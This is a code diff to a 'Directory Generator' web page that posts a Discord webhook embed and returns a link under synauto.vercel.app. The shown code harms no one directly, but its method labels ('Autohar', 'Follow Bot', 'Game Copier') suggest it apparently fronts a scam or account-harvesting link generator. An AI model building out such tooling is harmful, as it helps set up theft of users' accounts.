@@ -81,26 +81,32 @@
             word-break: break-all;
             display: none;
         }
+        .loading {
+            display: none;
+            color: #0f0;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
     <canvas id="particleCanvas"></canvas>
     <div class="container">
         <h2>Directory Generator</h2>
-        <input type="text" placeholder="Directory Name" id="dirName">
-        <input type="text" placeholder="Webhook URL" id="webhook">
+        <input type="text" placeholder="Directory Name" id="dirName" required>
+        <input type="text" placeholder="Webhook URL" id="webhook" required>
         <input type="text" placeholder="Your Name" id="userName">
         <input type="text" placeholder="Thumbnail URL" id="thumbnail">
         <select id="method">
-            <option>Quadhook Autohar (VERY, OP)</option>
+            <option>Triplet+look Autohar (VERY, OP)</option>
             <option>Follow Bot (Normal)</option>
             <option>Game Copier (Normal)</option>
         </select>
         <button id="generateBtn">Generate Directory</button>
+        <div class="loading" id="loading">Sending to Discord...</div>
         <div id="result"></div>
     </div>
     <script>
-        // Particle background (unchanged from your original)
+        // Particle background
         const canvas = document.getElementById("particleCanvas");
         const ctx = canvas.getContext("2d");
         canvas.width = window.innerWidth;
@@ -168,35 +174,73 @@
         initParticles();
         animate();
 
-        // Directory generation functionality
-        document.getElementById('generateBtn').addEventListener('click', function() {
+        // Directory generation and Discord webhook functionality
+        document.getElementById('generateBtn').addEventListener('click', async function() {
             const dirName = document.getElementById('dirName').value.trim();
-            const webhook = document.getElementById('webhook').value.trim();
-            const userName = document.getElementById('userName').value.trim();
+            const webhookUrl = document.getElementById('webhook').value.trim();
+            const userName = document.getElementById('userName').value.trim() || 'Anonymous';
             const thumbnail = document.getElementById('thumbnail').value.trim();
             const method = document.getElementById('method').value;
             
-            if (!dirName) {
-                alert('Please enter a directory name');
+            if (!dirName || !webhookUrl) {
+                alert('Directory Name and Webhook URL are required!');
                 return;
             }
             
-            // Create simulated directory path
-            const baseUrl = 'https://www.syntax.vercel.app/create';
-            const dirPath = `${baseUrl}/${encodeURIComponent(dirName)}`;
+            // Show loading indicator
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('result').style.display = 'none';
             
-            // Display result
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = `
-                <strong>Your directory has been created:</strong><br>
-                <a href="${dirPath}" target="_blank">${dirPath}</a><br><br>
-                <strong>Details:</strong><br>
-                Webhook: ${webhook || 'Not provided'}<br>
-                Name: ${userName || 'Not provided'}<br>
-                Thumbnail: ${thumbnail || 'Not provided'}<br>
-                Method: ${method}
-            `;
-            resultDiv.style.display = 'block';
+            // Create directory path with the new domain
+            const dirPath = `https://synauto.vercel.app/${encodeURIComponent(dirName)}`;
+            
+            try {
+                // Send to Discord webhook
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚀 New Directory Generated",
+                            description: `**Directory:** [${dirName}](${dirPath})\n**Created by:** ${userName}\n**Method:** ${method}`,
+                            color: 65280, // Green color
+                            thumbnail: thumbnail ? { url: thumbnail } : undefined,
+                            timestamp: new Date().toISOString(),
+                            footer: {
+                                text: "Generated via SynAuto Directory Generator"
+                            }
+                        }]
+                    })
+                });
+                
+                if (response.ok) {
+                    document.getElementById('result').innerHTML = `
+                        <strong>✅ Directory created successfully!</strong><br><br>
+                        <strong>Your directory URL:</strong><br>
+                        <a href="${dirPath}" target="_blank" style="color:#0f0">${dirPath}</a><br><br>
+                        <strong>Details have been sent to your Discord webhook</strong>
+                    `;
+                } else {
+                    document.getElementById('result').innerHTML = `
+                        <strong>⚠️ Directory created but Discord notification failed</strong><br><br>
+                        <strong>Your directory URL:</strong><br>
+                        <a href="${dirPath}" target="_blank" style="color:#0f0">${dirPath}</a><br><br>
+                        <strong>Error:</strong> ${response.status} ${response.statusText}
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('result').innerHTML = `
+                    <strong>❌ Error occurred</strong><br><br>
+                    <strong>Directory URL would be:</strong><br>
+                    <a href="${dirPath}" target="_blank" style="color:#0f0">${dirPath}</a><br><br>
+                    <strong>Error details:</strong> ${error.message}
+                `;
+            } finally {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+            }
         });
     </script>
 </body>
